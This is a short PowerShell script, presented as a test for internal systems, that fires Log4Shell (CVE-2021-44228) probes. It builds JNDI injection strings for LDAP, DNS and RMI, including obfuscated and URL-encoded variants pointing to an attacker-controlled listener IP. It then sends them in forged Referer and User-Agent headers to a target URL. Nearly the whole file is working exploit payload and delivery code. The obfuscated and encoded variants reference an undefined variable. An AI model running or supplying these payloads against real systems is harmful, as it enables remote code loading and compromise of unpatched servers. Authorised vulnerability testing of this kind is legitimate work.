# These are a set of commands to run in PowerShell to test for the
# presence of the Log4j vulnerability (CVE-2021-44228) against internal systems

#Credit: log4j nuclei https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/cves/2021/CVE-2021-44228.yaml
#Credit: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md
#Credit: https://github.com/fullhunt/log4j-scan/blob/master/log4j-scan.py
#Credit: https://github.com/aalex954/Log4PowerShell/blob/master/Log4ShellPoC.ps1#L285
#Credit: https://github.com/crypt0jan/log4j-powershell-checker/blob/main/log4j_ps_checker.ps1

# #Listener or burp collab server
$listener_ip = "192.168.226.130"
$listener_port = "80"

#target domain/url
$target_url = "http://192.168.226.130/test"

# the following will generate you a few permitations of the "jndi" string:
$log4j_ldap= "`${jndi:ldap://${listener_ip}/ldapTest}"
$log4j_dns = "`${jndi:dns://${listener_ip}}"
$log4j_rmi = "`${jndi:rmi://${listener_ip}:${listener_port}}/a"

$log4j_string_obfs = $log4j_string -replace("jndi:ldap", "`${::-j}`${::-n}`${::-d}`${::-i}:`${::-l}`${::-d}`${::-a}`${::-p}")
Add-Type -AssemblyName System.Web
$log4j_url_encoded_string = [System.Web.HttpUtility]::UrlEncode($log4j_string) 
$log4j_obfs_url_encoded_string = [System.Web.HttpUtility]::UrlEncode($log4j_string_obfs)

#Log4JTestValues
$log4jArray = @($log4j_ldap, $log4j_dns, $log4j_rmi, $log4j_string_obfs, $log4j_url_encoded_string, $log4j_obfs_url_encoded_string, "`${jndi:dns://${listener_ip}}","")

foreach ($arraryitem in $log4jArray) {
    Write-Host "Test: $arraryitem"
    $uar = $null
    try {
    # Headers:
    $ForgedHeaders = @{ `
        'Referer' = $arraryitem; `
        'User-Agent' = $arraryitem `
    }
    $Body = @{
        User = 'jdoe'
        Password = 'P@S$w0rd!'
    }
    #REF: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.3
    #$Form = @{
    #username  = 'John'
    #password   = 'Doe'
    #email      = 'john.doe@contoso.com'
    #auth    = 'Hiking','Fishing','Jogging'
    #}
    $uar = Invoke-WebRequest -TimeoutSec 5 -ErrorAction SilentlyContinue -Method 'POST' $target_url -Headers $ForgedHeaders
    #$Result = Invoke-WebRequest -Uri $Uri -Method Post -Form $Form
    Write-Host "Status: $uar.StatusCode" -ForegroundColor Green
    }catch {
        $uar = $_.Exception
        Write-Host "ERROR: $uar" -ForegroundColor Red
    }
}
